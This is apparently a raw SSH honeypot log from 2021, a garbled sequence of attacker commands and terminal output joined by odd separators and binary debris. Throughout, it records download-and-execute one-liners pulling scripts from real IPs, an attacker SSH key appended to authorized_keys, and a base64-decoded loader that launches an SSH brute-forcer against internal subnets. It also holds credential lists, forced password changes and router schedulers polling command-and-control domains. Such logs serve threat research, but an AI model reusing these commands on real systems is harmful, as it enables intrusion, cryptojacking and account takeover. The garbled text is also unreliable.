scp -|::|- -t -|::|- /tmp/wpAswCt9
pkill -|::|- kitten; -|::|- pkill -|::|- YDEdr; -|::|- pkill -|::|- ip; -|::|- pkill -|::|- xmrig; -|::|- pkill -|::|- cnrig; -|::|- pkill -|::|- kswapd0; -|::|- pkill -|::|- x86_64; -|::|- pkill -|::|- x86; -|::|- cd -|::|- /tmp; -|::|- rm -|::|- -rf -|::|- config.json; -|::|- rm -|::|- -rf -|::|- kitten; -|::|- wget -|::|- http://88.218.17.142/boom.sh; -|::|- curl -|::|- -O -|::|- http://88.218.17.142/boom.sh; -|::|- busybox -|::|- wget -|::|- http://88.218.17.142/boom.sh; -|::|- chmod -|::|- 777 -|::|- *; -|::|- sh -|::|- boom.sh; -|::|- cat -|::|- /etc/issue; -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- \`|q -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- \`8y -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- --2021-05-06 -|::|- 06:27:40-- -|::|- http://88.218.17.142/boom.sh -|::|- Connecting -|::|- to -|::|- 88.218.17.142:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 379 -|::|- (379bytes) -|::|- [application/x-sh] -|::|- Saving -|::|- to: -|::|- `/tmp/boom.sh' -|::|- 100% -|::|- [=======================================>] -|::|- 379 -|::|- 4K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 379 -|::|- 4K/s -|::|- 2021-05-06 -|::|- 06:27:40 -|::|- (4 -|::|- KB/s) -|::|- - -|::|- `/tmp/boom.sh' -|::|- saved -|::|- [379/379] -|::|- % -|::|- Total -|::|- % -|::|- Received -|::|- % -|::|- Xferd -|::|- Average -|::|- Speed -|::|- Time -|::|- Time -|::|- Time -|::|- Current -|::|- Dload -|::|- Upload -|::|- Total -|::|- Spent -|::|- Left -|::|- Speed -|::|- 100 -|::|- 379.0 -|::|- 100 -|::|- 379.0 -|::|- 0 -|::|- 0 -|::|- 63673 -|::|- 0 -|::|- --:--:-- -|::|- --:--:-- -|::|- --:--:-- -|::|- 65181 -|::|- --2021-05-06 -|::|- 06:27:40-- -|::|- http://88.218.17.142/boom.sh -|::|- Connecting -|::|- to -|::|- 88.218.17.142:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- \`}V -|::|- 200 -|::|- OK -|::|- Length: -|::|- 379 -|::|- (379bytes) -|::|- [application/x-sh] -|::|- Saving -|::|- to: -|::|- `/tmp/boom.sh' -|::|- 100% -|::|- [=======================================>] -|::|- 379 -|::|- 3K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 379 -|::|- 3K/s -|::|- \`MY -|::|- 2021-05-06 -|::|- 06:27:40 -|::|- (3 -|::|- KB/s) -|::|- - -|::|- `/tmp/boom.sh' -|::|- saved -|::|- [379/379] -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l
wget -|::|- http://103.3.63.84/script/ssh -|::|- -O- -|::|- | -|::|- sh; -|::|- curl -|::|- http://103.3.63.84/script/ssh -|::|- | -|::|- sh -|::|- --2021-05-08 -|::|- 09:20:39-- -|::|- http://103.3.63.84/script/ssh -|::|- Connecting -|::|- to -|::|- 103.3.63.84:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- W`: -|::|- 200 -|::|- OK -|::|- Length: -|::|- 679 -|::|- (679bytes) -|::|- [application/octet-stream] -|::|- Saving -|::|- to: -|::|- `/home/admin/ssh' -|::|- 100% -|::|- [=======================================>] -|::|- 679 -|::|- 0K/s -|::|- eta -|::|- 0s -|::|- W`|# -|::|- 100%[======================================>] -|::|- 679 -|::|- 0K/s -|::|- 2021-05-08 -|::|- 09:20:40 -|::|- (0 -|::|- KB/s) -|::|- - -|::|- `/home/admin/ssh' -|::|- saved -|::|- [679/679] -|::|- 'NoneType' -|::|- object -|::|- is -|::|- not -|::|- subscriptable -|::|- 2021-05-08 -|::|- 09:20:40 -|::|- ERROR -|::|- 404: -|::|- Not -|::|- Found.
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- BPrLUEoz -|::|- && -|::|- bash -|::|- -c -|::|- ./BPrLUEoz -|::|- -bash: -|::|- ./BPrLUEoz: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- agency -|::|- " -|::|- > -|::|- /tmp/up.txt
˞`x= -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- XiRXkS7I -|::|- && -|::|- bash -|::|- -c -|::|- ./XiRXkS7I -|::|- -bash: -|::|- ./XiRXkS7I: -|::|- command -|::|- not -|::|- found
(`DW -|::|- scp -|::|- -t -|::|- /tmp/XxUaqqOB -|::|- (`N^ -|::|- (`}^ -|::|- (`@_ -|::|- (`l_
z܉`Tf -|::|- z܉`h -|::|- echo -|::|- "root -|::|- admin1" -|::|- > -|::|- /tmp/up.txt -|::|- {܉`@
R`mk -|::|- R`Sl -|::|- scp -|::|- -t -|::|- /tmp/bzkxaVoK -|::|- R`]q -|::|- R`_r -|::|- R`%s -|::|- R`Ps -|::|- R`{s
scp -|::|- -t -|::|- /tmp/sBFj54JU
cd -|::|- ~ -|::|- && -|::|- rm -|::|- -rf -|::|- .ssh -|::|- && -|::|- mkdir -|::|- .ssh -|::|- && -|::|- echo -|::|- "ssh-rsa -|::|- AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== -|::|- mdrfckr">>.ssh/authorized_keys -|::|- && -|::|- chmod -|::|- -R -|::|- go= -|::|- ~/.ssh -|::|- && -|::|- cd -|::|- ~ -|::|- mkdir: -|::|- cannot -|::|- create -|::|- directory -|::|- `.ssh': -|::|- File -|::|- exists -|::|- -bash: -|::|- /home/admin/.ssh/authorized_keys: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
scp -|::|- -t -|::|- /tmp/XiRXkS7I
[email] -|::|- linux -|::|- node:~$ -|::|- 23:19:45 -|::|- up -|::|- 3 -|::|- days, -|::|- 3:32, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00 -|::|- USER -|::|- TTY -|::|- FROM -|::|- LOGIN@ -|::|- IDLE -|::|- JCPU -|::|- PCPU -|::|- WHAT -|::|- user -|::|- pts/0 -|::|- 213.196.213.8 -|::|- 23:19 -|::|- 0.00s -|::|- 0.00s -|::|- 0.00s -|::|- w -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- lscpu: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- lspci: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- ip: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- ip: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- 23:19:49 -|::|- up -|::|- 3 -|::|- days, -|::|- 3:32, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00 -|::|- USER -|::|- TTY -|::|- FROM -|::|- LOGIN@ -|::|- IDLE -|::|- JCPU -|::|- PCPU -|::|- WHAT -|::|- user -|::|- pts/0 -|::|- 213.196.213.8 -|::|- 23:19 -|::|- 0.00s -|::|- 0.00s -|::|- 0.00s -|::|- w -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- Linux -|::|- pouta.csc -|::|- linux -|::|- node -|::|- 5.4.0-70-generic -|::|- #78-Ubuntu -|::|- SMP -|::|- Fri -|::|- Mar -|::|- 19 -|::|- 13:29:52 -|::|- UTC -|::|- 2021 -|::|- x86_64 -|::|- GNU/Linux -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- Try -|::|- `shutdown -|::|- --help' -|::|- for -|::|- more -|::|- information. -|::|- [email] -|::|- linux -|::|- node:~$
echo -|::|- "root -|::|- 123456789a -|::|- " -|::|- > -|::|- /tmp/up.txt
ZC`&2 -|::|- ZC`/4 -|::|- cd -|::|- /dev/shm -|::|- || -|::|- cd -|::|- /tmp -|::|- || -|::|- cd -|::|- /var/run -|::|- || -|::|- cd -|::|- /mnt; -|::|- wget -|::|- 198.98.56.65/krax -|::|- || -|::|- curl -|::|- -o -|::|- krax -|::|- 198.98.56.65/krax; -|::|- tar -|::|- xvf -|::|- krax; -|::|- cd -|::|- ._lul; -|::|- chmod -|::|- +x -|::|- *; -|::|- ./krn; -|::|- ./krane -|::|- ubuntu -|::|- ZC`= -|::|- --2021-05-12 -|::|- 21:06:34-- -|::|- http://198.98.56.65/krax -|::|- ZC`> -|::|- Connecting -|::|- to -|::|- 198.98.56.65:80... -|::|- connected. -|::|- ZC`> -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- ZC`L -|::|- 200 -|::|- OK -|::|- Length: -|::|- 3096097 -|::|- (2M) -|::|- [text/whatever] -|::|- ZC`bN -|::|- Saving -|::|- to: -|::|- `/mnt/krax' -|::|- 0% -|::|- [> -|::|- ] -|::|- 13,650 -|::|- 51K/s -|::|- eta -|::|- 1m -|::|- 0s -|::|- [C`3M -|::|- 5% -|::|- [=> -|::|- ] -|::|- 174,658 -|::|- 216K/s -|::|- eta -|::|- 13s -|::|- [C`x -|::|- 80% -|::|- [===============================> -|::|- ] -|::|- 2,499,858 -|::|- 1862K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 3,096,097 -|::|- 1862K/s -|::|- [C`" -|::|- 2021-05-12 -|::|- 21:06:35 -|::|- (1862 -|::|- KB/s) -|::|- - -|::|- `/mnt/krax' -|::|- saved -|::|- [3096097/3096097] -|::|- % -|::|- Total -|::|- % -|::|- Received -|::|- % -|::|- Xferd -|::|- Average -|::|- Speed -|::|- Time -|::|- Time -|::|- Time -|::|- Current -|::|- Dload -|::|- Upload -|::|- Total -|::|- Spent -|::|- Left -|::|- Speed
scp -|::|- -t -|::|- /tmp/xvGMtotm -|::|- S`0# -|::|- S`^# -|::|- S`=$ -|::|- S`}&
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- qejPg5j0 -|::|- && -|::|- bash -|::|- -c -|::|- ./qejPg5j0 -|::|- -bash: -|::|- ./qejPg5j0: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- fUZbZWCy -|::|- && -|::|- bash -|::|- -c -|::|- ./fUZbZWCy -|::|- -bash: -|::|- ./fUZbZWCy: -|::|- command -|::|- not -|::|- found
A`>& -|::|- scp -|::|- -t -|::|- /tmp/qejPg5j0 -|::|- A`q+ -|::|- A`A, -|::|- A`;- -|::|- A`h-
echo -|::|- "root -|::|- qaz123wsx" -|::|- > -|::|- /tmp/up.txt
ߗ`>3 -|::|- echo -|::|- "root -|::|- 12345trewq -|::|- " -|::|- > -|::|- /tmp/up.txt
20:09:54 -|::|- up -|::|- 22 -|::|- min, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00 -|::|- USER -|::|- TTY -|::|- FROM -|::|- LOGIN@ -|::|- IDLE -|::|- JCPU -|::|- PCPU -|::|- WHAT -|::|- admin -|::|- pts/0 -|::|- 101.227.5.66 -|::|- 20:09 -|::|- 0.00s -|::|- 0.00s -|::|- 0.00s -|::|- w
sleep -|::|- 15s -|::|- && -|::|- cd -|::|- /var/tmp; -|::|- echo -|::|- #!/bin/bash
cd /tmp	
rm -rf .ssh
rm -rf .mountfs
rm -rf .X13-unix
rm -rf .X17-unix
rm -rf .X19-unix
mkdir .X19-unix
cd .X19-unix
mv /var/tmp/dota3.tar.gz dota3.tar.gz
tar xf dota3.tar.gz
sleep 3s && cd /tmp/.X19-unix/.rsync/c
nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m && nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m && cd ..; /tmp/.X19-unix/.rsync/initall 2>1&
exit 0 -|::|- | -|::|- base64 -|::|- --decode -|::|- | -|::|- bash
-O`.> -|::|- scp -|::|- -t -|::|- /tmp/e8eLilnd -|::|- -O`|D -|::|- -O`>E -|::|- -O`E -|::|- -O`E -|::|- -O`E -|::|- -O`9F -|::|- -O`eF -|::|- -O`F -|::|- -O`F -|::|- .O`B
ɏ`h* -|::|- echo -|::|- "root -|::|- peter123" -|::|- > -|::|- /tmp/up.txt
ls -|::|- -la -|::|- /var/run/gcc.pid -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/run/gcc.pid: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
rm -|::|- -rf -|::|- /var/run/1sh; -|::|- wget -|::|- -c -|::|- http://71.127.148.69/.x/1sh -|::|- -P -|::|- /var/run -|::|- && -|::|- sh -|::|- /var/run/1sh -|::|- & -|::|- --2021-04-29 -|::|- 00:24:26-- -|::|- http://71.127.148.69/.x/1sh -|::|- Connecting -|::|- to -|::|- 71.127.148.69:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 1655 -|::|- (1K) -|::|- [text/plain] -|::|- Saving -|::|- to: -|::|- `/home/root/1sh' -|::|- 100% -|::|- [=======================================>] -|::|- 1,655 -|::|- 6K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 1,655 -|::|- 6K/s -|::|- 2021-04-29 -|::|- 00:24:26 -|::|- (6 -|::|- KB/s) -|::|- - -|::|- `/home/root/1sh' -|::|- saved -|::|- [1655/1655]
Wފ`,Y -|::|- Wފ`Y -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- r52q3e0X -|::|- && -|::|- bash -|::|- -c -|::|- ./r52q3e0X -|::|- Wފ`c -|::|- -bash: -|::|- ./r52q3e0X: -|::|- command -|::|- not -|::|- found -|::|- Wފ`vg
echo -|::|- -e -|::|- "\x6F\x6B"
щ`9! -|::|- rm -|::|- -rf -|::|- /var/tmp/.var03522123
echo -|::|- "root -|::|- !QAZxsw2#EDCvfr4%TGB" -|::|- > -|::|- /tmp/up.txt
H`|Q -|::|- echo -|::|- "root -|::|- welcome" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 5obYfVTI -|::|- && -|::|- bash -|::|- -c -|::|- ./5obYfVTI -|::|- -bash: -|::|- ./5obYfVTI: -|::|- command -|::|- not -|::|- found
x`7i -|::|- ls -|::|- -la -|::|- /etc/daemon.cfg -|::|- x`;o -|::|- ls: -|::|- cannot -|::|- access -|::|- /etc/daemon.cfg: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- x`?*
cat -|::|- /proc/uptime -|::|- cat: -|::|- /proc/uptime: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
echo -|::|- -n -|::|- 71zwDOOR|md5sum -|::|- -bash: -|::|- md5sum: -|::|- command -|::|- not -|::|- found
echo -|::|- "user -|::|- 19999999" -|::|- > -|::|- /tmp/up.txt
cat -|::|- /proc/cpuinfo -|::|- | -|::|- grep -|::|- name -|::|- | -|::|- cut -|::|- -f2 -|::|- -d: -|::|- | -|::|- uniq -|::|- -c; -|::|- nvidia-smi -|::|- --list-gpus -|::|- | -|::|- grep -|::|- 0 -|::|- | -|::|- cut -|::|- -f2 -|::|- -d: -|::|- | -|::|- uniq -|::|- -c -|::|- -bash: -|::|- cut: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- cut: -|::|- command -|::|- not -|::|- found
c`6Q -|::|- scp -|::|- -t -|::|- /tmp/V1Y2k0gD -|::|- c`^W -|::|- c`(X -|::|- c`iX -|::|- c`;Y -|::|- c`fY
1Չ`Ӆ -|::|- 1Չ`{ -|::|- echo -|::|- "postgres -|::|- p@ssw0rd" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- cimszosn -|::|- && -|::|- bash -|::|- -c -|::|- ./cimszosn -|::|- -bash: -|::|- ./cimszosn: -|::|- command -|::|- not -|::|- found
echo -|::|- "adminserver\\n3TaDPhAtfDF6\\n3TaDPhAtfDF6\\n" -|::|- passwd
echo -|::|- "qwe@123\\nN39CnRP7OkOr\\nN39CnRP7OkOr\\n" -|::|- passwd
echo -|::|- letmein\\n9k3AoNNacrPj\\n9k3AoNNacrPj\\n" -|::|- passwd
echo -|::|- "swingbylabs\\naFiJeMWfF7Eq\\naFiJeMWfF7Eq\\n" -|::|- passwd
echo -|::|- "admin\\nOJWKUhyCQYwU\\nOJWKUhyCQYwU\\n" -|::|- passwd
echo -|::|- "root:AEsndTYzVY9i" -|::|- chpasswd -|::|- bash
echo -|::|- "root:RkdzeP5xSBEN" -|::|- chpasswd -|::|- bash
echo -|::|- "root:cr1mM0SwfHZz" -|::|- chpasswd -|::|- bash
system -|::|- scheduler -|::|- add -|::|- name="U6" -|::|- interval=10m -|::|- on-event="/tool -|::|- fetch -|::|- url=http://strtbiz.site/poll/d6633796-87cb-4028-a93b-432df89e383f -|::|- mode=http -|::|- dst-path=7wmp0b4s.rsc\\r\ -|::|- import -|::|- 7wmp0b4s.rsc -|::|- policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
system -|::|- scheduler -|::|- add -|::|- name="U6" -|::|- interval=10m -|::|- on-event="/tool -|::|- fetch -|::|- url=http://bestony.club/poll/9d0479ac-2889-44fc-bcf4-238320aac82b -|::|- mode=http -|::|- dst-path=7wmp0b4s.rsc\\r\ -|::|- import -|::|- 7wmp0b4s.rsc -|::|- policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
system -|::|- scheduler -|::|- add -|::|- name="U6" -|::|- interval=10m -|::|- on-event="/tool -|::|- fetch -|::|- url=http://myfrance.xyz/poll/489f9f54-b2f2-4adf-84fc-bddee250565d -|::|- mode=http -|::|- dst-path=7wmp0b4s.rsc\\r\ -|::|- import -|::|- 7wmp0b4s.rsc" -|::|- policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
/ip -|::|- cloud -|::|- print -|::|- -bash: -|::|- /ip: -|::|- command -|::|- not -|::|- found
9`?0 -|::|- echo -|::|- "root -|::|- Q2w3e4r5" -|::|- > -|::|- /tmp/up.txt
щ`mP -|::|- echo -|::|- "321" -|::|- > -|::|- /var/tmp/.var03522123
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- Pe48ZWCL -|::|- && -|::|- bash -|::|- -c -|::|- ./Pe48ZWCL -|::|- -bash: -|::|- ./Pe48ZWCL: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- 28ced69e8eb76da240271dba206ce53f -|::|- " -|::|- > -|::|- /tmp/up.txt
VӞ`W -|::|- VӞ`}X -|::|- echo -|::|- "linix37*)@#BT"\nt5jqEYpv3To3\nt5jqEYpv3To3\n"|passwd -|::|- VӞ`8] -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file -|::|- VӞ`N
cd -|::|- /var/run -|::|- ; -|::|- rm -|::|- -rf -|::|- tsh -|::|- ; -|::|- tftp -|::|- -g -|::|- 127.0.0.1 -|::|- -r -|::|- tsh -|::|- ; -|::|- sh -|::|- tsh -|::|- &
echo -|::|- "admin -|::|- 1qaz@WSX3edc" -|::|- > -|::|- /tmp/up.txt -|::|- l߉`>
O`AD -|::|- scp -|::|- -t -|::|- /tmp/BPrLUEoz -|::|- O`iJ -|::|- O`OL -|::|- O`3M -|::|- O``M
echo -|::|- "root -|::|- Test@123" -|::|- > -|::|- /tmp/up.txt -|::|- c`4-
6g`p -|::|- scp -|::|- -t -|::|- /tmp/M01GZwRG -|::|- 6g`˯ -|::|- 6g`F -|::|- 6g`u -|::|- 6g`ϰ -|::|- 6g`' -|::|- 6g`R
wget -|::|- -qO -|::|- - -|::|- http://71.127.148.69/.x/2sh -|::|- | -|::|- sh -|::|- > -|::|- /dev/null -|::|- 2>&1 -|::|- &
ls -|::|- -la -|::|- /dev/ttyGSM* -|::|- /dev/ttyUSB-mod* -|::|- /var/spool/sms/* -|::|- /var/log/smsd.log -|::|- /etc/smsd.conf* -|::|- /usr/bin/qmuxd -|::|- /var/qmux_connect_socket -|::|- /etc/config/simman -|::|- /dev/modem* -|::|- /var/config/sms/* -|::|- ls: -|::|- cannot -|::|- access -|::|- /dev/ttyGSM*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /dev/ttyUSB-mod*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/spool/sms/*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/log/smsd.log: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /etc/smsd.conf*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /usr/bin/qmuxd: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/qmux_connect_socket: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /etc/config/simman: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /dev/modem*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/config/sms/*: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
echo -|::|- "root -|::|- qq123123" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- Ul9w3KBu -|::|- && -|::|- bash -|::|- -c -|::|- ./Ul9w3KBu -|::|- -bash: -|::|- ./Ul9w3KBu: -|::|- command -|::|- not -|::|- found
ۉ`xY -|::|- echo -|::|- "postgres -|::|- server" -|::|- > -|::|- /tmp/up.txt
echo -|::|- "1" -|::|- > -|::|- /var/tmp/.systemcache436621
[email] -|::|- linux -|::|- node:~$ -|::|- free -|::|- -m -|::|- total -|::|- used -|::|- free -|::|- shared -|::|- buff/cache -|::|- available -|::|- Mem: -|::|- 16010 -|::|- 955 -|::|- 6603 -|::|- 1 -|::|- 8451 -|::|- 15342 -|::|- Swap: -|::|- 0 -|::|- 0 -|::|- 0 -|::|- [email] -|::|- linux -|::|- node:~$
echo -|::|- -e -|::|- "qwer`123\nf5j4hCWTLakZ\nf5j4hCWTLakZ"|passwd|bash -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
scp -|::|- -t -|::|- /tmp/q1H3J2X7
2:`} -|::|- 2:`~ -|::|- echo -|::|- "root -|::|- zxasqw -|::|- " -|::|- > -|::|- /tmp/up.txt
scp -|::|- -t -|::|- /tmp/4nJFYqXl
&`Ri -|::|- ps -|::|- | -|::|- grep -|::|- '[Mm]iner'
scp -|::|- -t -|::|- /tmp/b1OxqJDe
